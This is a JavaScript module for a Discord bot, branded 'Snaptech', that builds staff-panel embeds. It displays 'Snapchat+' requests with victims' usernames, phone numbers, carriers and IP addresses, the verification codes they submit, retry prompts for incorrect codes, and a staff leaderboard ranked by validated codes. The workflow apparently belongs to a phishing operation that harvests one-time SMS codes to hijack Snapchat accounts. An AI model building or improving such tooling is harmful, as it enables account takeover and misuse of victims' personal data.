/**
 * embedBuilder.js — Discord embed constructors  (v2.3)
 *
 * Improvements:
 *  - New request embed: attempt count badge, cleaner field layout
 *  - Code embed: big code display, attempt # visible
 *  - Retry embed: shows which attempt this is
 *  - Stats embed: progress bar for completion rate
 *  - Hourly chart: improved ASCII bars with max-value scaling
 */

import { EmbedBuilder }                                      from "discord.js";
import { getOperatorColor, STATUS_COLORS }                   from "./colors.js";
import { formatPhone, formatIP, getCarrierName, formatDate } from "./formatters.js";

// ─── Helpers ──────────────────────────────────────────────────────────────────

function progressBar(value, max, length = 12) {
    const filled = Math.round((value / Math.max(max, 1)) * length);
    return "█".repeat(filled) + "░".repeat(length - filled);
}

function retryLabel(row) {
    // Try to infer attempt count from logs — not available here so we use a neutral label
    return row.status === "retry_code" ? "🔁 Nouvelle tentative" : "";
}

// ─── New request ──────────────────────────────────────────────────────────────

export function buildNewRequestEmbed(row) {
    const color   = getOperatorColor(row.operator);
    const carrier = getCarrierName(row.operator);
    const ip      = row.ip_address;

    return new EmbedBuilder()
        .setTitle("📱 Nouvelle demande Snapchat+")
        .setColor(color)
        .setDescription(
            `> 📡 **${carrier}** — ${row.country || "?"}  |  🆔 \`#${row.id}\``
        )
        .addFields(
            { name: "👤 Username",    value: "```\n" + row.username + "\n```",    inline: true  },
            { name: "📞 Téléphone",   value: "```\n" + formatPhone(row.phone) + "\n```", inline: true },
            { name: "📡 Opérateur",   value: "`" + carrier + "`",                inline: true  },
            { name: "🌍 Pays",        value: "`" + (row.country || "?") + "`",   inline: true  },
            { name: "🌐 IP",          value: formatIP(ip),                        inline: true  },
            { name: "⏰ Reçue",       value: "`" + formatDate(row.created_at) + "`", inline: true },
        )
        .setFooter({ text: "⏳ En attente d'un membre du staff  •  Snaptech" })
        .setTimestamp();
}

// ─── Code submitted ───────────────────────────────────────────────────────────

export function buildCodeSubmittedEmbed(row) {
    const color   = getOperatorColor(row.operator);
    const carrier = getCarrierName(row.operator);
    const code    = row.staff_code || "N/A";
    const len     = row.code_length || 6;
    const ip      = row.ip_address;

    // Format the code with spaces every 3 digits for readability
    const codeFmt = code.length > 3
        ? code.slice(0, 3) + " " + code.slice(3)
        : code;

    return new EmbedBuilder()
        .setTitle("🔓 Code soumis par l'utilisateur")
        .setColor(0x10b981)
        .setDescription(
            `> 🔢 Code **${len} chiffres** — \`#${row.id}\`  |  📡 **${carrier}**`
        )
        .addFields(
            { name: "👤 Username",    value: "```\n" + row.username + "\n```",    inline: true  },
            { name: "📞 Téléphone",   value: "```\n" + formatPhone(row.phone) + "\n```", inline: true },
            { name: "🔢 Code entré",  value: "```\n" + codeFmt + "\n```",         inline: false },
            { name: "📡 Opérateur",   value: "`" + carrier + "`",                inline: true  },
            { name: "🌍 Pays",        value: "`" + (row.country || "?") + "`",   inline: true  },
            { name: "🌐 IP",          value: formatIP(ip),                        inline: true  },
        )
        .setFooter({ text: "⚡ Valider ou refuser le code ci-dessous  •  Snaptech" })
        .setTimestamp();
}

// ─── Retry ────────────────────────────────────────────────────────────────────

export function buildRetryEmbed(row) {
    const color   = getOperatorColor(row.operator);
    const carrier = getCarrierName(row.operator);
    const ip      = row.ip_address;

    return new EmbedBuilder()
        .setTitle("🔄 Nouveau code en attente")
        .setColor(0xf59e0b)
        .setDescription(
            `> ⚠️ Le code précédent était **incorrect**.\n> L'utilisateur saisit un nouveau code — vérifiez ci-dessous.`
        )
        .addFields(
            { name: "👤 Username",  value: "```\n" + row.username + "\n```",    inline: true  },
            { name: "📞 Téléphone", value: "```\n" + formatPhone(row.phone) + "\n```", inline: true },
            { name: "📡 Opérateur", value: "`" + carrier + "`",                inline: true  },
            { name: "🌍 Pays",      value: "`" + (row.country || "?") + "`",   inline: true  },
            { name: "🌐 IP",        value: formatIP(ip),                        inline: true  },
        )
        .setFooter({ text: "🔁 Nouvelle tentative  •  Snaptech" })
        .setTimestamp();
}

// ─── Stats ────────────────────────────────────────────────────────────────────

export function buildStatsEmbed(stats, todayStats) {
    const total          = Number(stats.total) || 0;
    const completed      = Number(stats.completed) || 0;
    const completionRate = total > 0 ? Math.round((completed / total) * 100) : 0;
    const bar            = progressBar(completed, total);

    return new EmbedBuilder()
        .setTitle("📊 Statistiques globales")
        .setColor(0x3b82f6)
        .setDescription(
            `**Taux de complétion : ${completionRate}%**\n\`${bar}\` ${completed}/${total}`
        )
        .addFields(
            { name: "📋 Total",          value: "`" + stats.total      + "`", inline: true },
            { name: "⏳ En attente",     value: "`" + stats.pending    + "`", inline: true },
            { name: "👤 En cours",       value: "`" + stats.processing + "`", inline: true },
            { name: "⏱️ Attente code",  value: "`" + stats.waiting    + "`", inline: true },
            { name: "🔓 Code soumis",   value: "`" + stats.submitted  + "`", inline: true },
            { name: "✅ Complétés",      value: "`" + stats.completed  + "`", inline: true },
            { name: "🔄 Retry",          value: "`" + stats.retry      + "`", inline: true },
            { name: "❌ Mauvais numéro", value: "`" + stats.wrong      + "`", inline: true },
            { name: "🚫 IPs bannies",    value: "`" + stats.banned     + "`", inline: true },
            {
                name:  "📅 Aujourd'hui",
                value: `Demandes : \`${todayStats.requests}\`  ·  Complétées : \`${todayStats.completed}\``,
                inline: false,
            },
        )
        .setFooter({ text: "📡 Snaptech  •  Live data" })
        .setTimestamp();
}

// ─── Operator stats ───────────────────────────────────────────────────────────

export function buildOperatorStatsEmbed(operatorStats) {
    const embed = new EmbedBuilder()
        .setTitle("📡 Répartition par opérateur")
        .setColor(0x8b5cf6)
        .setDescription("Demandes par opérateur mobile");

    const total = operatorStats.reduce((s, r) => s + Number(r.count), 0);
    const medals = ["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣"];

    operatorStats.forEach((row, i) => {
        const carrier = getCarrierName(row.operator);
        const pct     = total > 0 ? Math.round((row.count / total) * 100) : 0;
        const bar     = progressBar(row.count, total, 8);
        embed.addFields({
            name:   (medals[i] || "•") + " " + carrier,
            value:  `\`${bar}\` \`${row.count}\` (${pct}%)`,
            inline: false,
        });
    });

    embed.setFooter({ text: "📡 Snaptech Operators" }).setTimestamp();
    return embed;
}

// ─── Leaderboard ──────────────────────────────────────────────────────────────

export function buildLeaderboardEmbed(rows, limit) {
    const embed = new EmbedBuilder()
        .setTitle("🏆 Classement Staff")
        .setColor(0xf59e0b)
        .setDescription("Top " + limit + " staff par validations de code");

    if (rows.length === 0) {
        embed.setDescription("🏆 Top " + limit + " staff par validations\n\n*Aucune validation enregistrée.*");
    } else {
        const maxV  = Number(rows[0].validations) || 1;
        const medals = ["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣","🔟"];
        rows.forEach((row, i) => {
            const bar = progressBar(row.validations, maxV, 10);
            embed.addFields({
                name:   (medals[i] || "•") + " " + row.staff,
                value:  `\`${bar}\` ✅ \`${row.validations}\` validations`,
                inline: false,
            });
        });
    }

    embed.setFooter({ text: "🏆 Snaptech Leaderboard" }).setTimestamp();
    return embed;
}

// ─── Hourly activity ──────────────────────────────────────────────────────────

export function buildHourlyStatsEmbed(hourlyData) {
    const embed = new EmbedBuilder()
        .setTitle("📈 Activité — Dernières 24h")
        .setColor(0x10b981);

    if (hourlyData.length === 0) {
        embed.setDescription("*Aucune activité ces dernières 24 heures.*");
    } else {
        const maxCount = Math.max(...hourlyData.map(r => Number(r.count)));
        let chart = "```\n";
        hourlyData.forEach(row => {
            const hour  = String(row.hour).padStart(2, "0") + "h";
            const count = Number(row.count);
            const bars  = Math.round((count / Math.max(maxCount, 1)) * 16);
            const bar   = "█".repeat(bars).padEnd(16);
            chart      += `${hour} ${bar} ${count}\n`;
        });
        chart += "```";
        embed.setDescription(chart);
    }

    embed.setFooter({ text: "📈 Snaptech Activity" }).setTimestamp();
    return embed;
}

// ─── Staff activity ───────────────────────────────────────────────────────────

export function buildStaffActivityEmbed(activityData) {
    const embed = new EmbedBuilder()
        .setTitle("👥 Activité Staff")
        .setColor(0xec4899);

    if (activityData.length === 0) {
        embed.setDescription("*Aucune activité enregistrée.*");
    } else {
        const grouped = {};
        activityData.forEach(row => {
            if (!grouped[row.staff]) grouped[row.staff] = {};
            grouped[row.staff][row.action] = row.count;
        });

        const actionEmoji = {
            claim:        "📋",
            unclaim:      "↩️",
            set_length:   "🔢",
            wrong_number: "❌",
            true_code:    "✅",
            false_code:   "🚫",
        };

        Object.entries(grouped).forEach(([staff, actions]) => {
            const lines = Object.entries(actions)
                .map(([action, count]) => `${actionEmoji[action] || "•"} ${action}: \`${count}\``)
                .join("\n");
            embed.addFields({ name: "👤 " + staff, value: lines, inline: true });
        });
    }

    embed.setFooter({ text: "👥 Snaptech Staff" }).setTimestamp();
    return embed;
}

// ─── Panel ────────────────────────────────────────────────────────────────────

export function buildPanelEmbed() {
    return new EmbedBuilder()
        .setTitle("🎛️ Panel Staff — Snaptech")
        .setDescription(
            "Les demandes apparaissent ici automatiquement via le polling.\n" +
            "Utilisez les boutons sur chaque embed pour traiter les demandes.\n\n" +
            "**🎨 Couleurs par opérateur :**"
        )
        .addFields(
            { name: "🔴 Rouge",  value: "SFR · Telenet",            inline: true },
            { name: "🟠 Orange", value: "Orange · Orange Belgique", inline: true },
            { name: "🔵 Bleu",   value: "Bouygues · BASE",          inline: true },
            { name: "🟣 Violet", value: "Proximus",                  inline: true },
            { name: "🟡 Jaune",  value: "Autre opérateur",          inline: true },
        )
        .setColor(0x000000)
        .setFooter({ text: "🎛️ Snaptech Panel  •  v2.3" })
        .setTimestamp();
}
